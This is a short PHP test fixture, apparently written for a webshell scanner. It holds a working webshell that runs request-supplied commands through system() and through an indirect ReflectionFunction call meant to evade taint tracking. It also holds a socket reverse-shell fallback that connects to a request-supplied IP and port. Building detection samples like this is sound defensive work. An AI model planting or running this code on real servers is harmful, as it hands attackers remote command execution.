<?php
// Fixture: indirect request-driven command webshell with a socket reverse
// shell fallback. Mirrors the laudanum-adjacent shape where request data is
// assigned to a variable before execution (never tainted directly).
$cmd = 'cmd';
$command = $_REQUEST[$cmd];
$system = 'system';
$exec = new ReflectionFunction($system);
$exec->invoke($command);
system($command);
$ip = $_REQUEST['ip'];
$port = (int)$_REQUEST['port'];
$sock = fsockopen($ip, $port);
$shell = '/bin/sh -i <&3 >&3 3<&0';
fwrite($sock, $shell);
